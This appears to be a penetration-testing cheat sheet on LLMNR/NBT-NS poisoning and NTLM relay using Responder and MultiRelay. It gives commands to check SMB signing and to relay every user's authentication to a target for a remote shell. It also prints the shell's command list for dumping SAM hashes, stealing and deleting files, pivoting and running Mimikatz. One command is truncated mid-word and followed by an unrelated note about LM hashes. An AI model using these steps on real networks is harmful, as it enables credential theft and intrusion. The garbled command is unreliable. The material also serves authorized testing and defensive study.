# LLMNR/NBT-NS Poisoning & Relay
Tool: Responder & MultiRelay

LLMNR and NBT-NS are fall-back protocols of DNS. Responder listens for NetBIOS and LLMNR broadcast and multicast requests for hostnames from other machines in the local subnet, and responds to them. 

From there, we can use MultiRelay to relay the authentication to the legitimate server. MultiRelay tool spins up a shell by default (and you can privilege escalate from there); if `-d` flag is used, it dumps the local password hashes. 

# Why it works 

## Poisoning
Common causes LLMNR/NBT-NS is used on the LAN that allow an attacker to resolve to a non-existent hostname include: 
- typo in hostname
- misconfiguration on the DNS server side or client side
- decommissioned DNS records
- Google Chrome attempting to [resolve three randomized domain names at start up](https://unix.stackexchange.com/questions/363512/chrome-dns-requests-with-random-dns-names-malware) to avoid [DNS hijacking by the ISP](https://en.wikipedia.org/wiki/DNS_hijacking#Manipulation_by_ISPs)
- WPAD (Web Proxy Auto-Discovery Protocol): if a web browser is set to automatically detect proxy settings, it will use the WPAD protocol to discover the URL of a proxy configuration file called _wpad.dat_. To discover this URL, WPAD will iterate through a series of potential URLs and hostnames. Google Chrome and Firefox will not trigger this behavior by default, but Internet Explorer will.

## Relay
GOOD article: https://en.hackndo.com/ntlm-relay/#ntlm-relay 

For SMB relay to work, SMB signing must be disabled in the victim and SMB server.  

# Tool: Responder & MultiRelay

Check SMB signing with `RunFinger.py`
```
$ sudo ./tools/RunFinger.py -i <target-ip-or-netblock>
```

If we're going to relay with `MultiRelay.py` **while running `responder.py`**, we need to disable the SMB server and HTTP server in `Responder.conf`, because `MultiRelay.py` need to use these ports to relay. Alternatively, you can start responder first. 


Sniff on interface `tap0` and downgrade NTLM to LM whenever possible:
```
$ sudo respon
> The LM hash is stored for backward compatibility reasons. Many environments no longer need it and can disable storage of that value.

Relay traffic to a target server (for all users)
```
$ sudo responder-MultiRelay -t <target-ip> -u ALL
```
* might need to cd into `cd /usr/share/responder/tools` first if encountering  `[!]MultiRelay/bin/ folder is empty`
* this should take you to a shell. From there, you can scan subnet, escalate privilege etc. 
```
Available commands:
dump               -> Extract the SAM database and print hashes.
regdump KEY        -> Dump an HKLM registry key (eg: regdump SYSTEM)
read Path_To_File  -> Read a file (eg: read /windows/win.ini)
get  Path_To_File  -> Download a file (eg: get users/administrator/desktop/password.txt)
delete Path_To_File-> Delete a file (eg: delete /windows/temp/executable.exe)
upload Path_To_File-> Upload a local file (eg: upload /home/user/bk.exe), files will be uploaded in \windows\temp\
runas  Command     -> Run a command as the currently logged in user. (eg: runas whoami)
scan /24           -> Scan (Using SMB) this /24 or /16 to find hosts to pivot to
pivot  IP address  -> Connect to another host (eg: pivot 10.0.0.12)
mimi  command      -> Run a remote Mimikatz 64 bits command (eg: mimi coffee)
mimi32  command    -> Run a remote Mimikatz 32 bits command (eg: mimi coffee)
lcmd  command      -> Run a local command and display the result in MultiRelay shell (eg: lcmd ifconfig)
help               -> Print this message.
exit               -> Exit this shell and return in relay mode.
                      If you want to quit type exit and then use CTRL-C
```







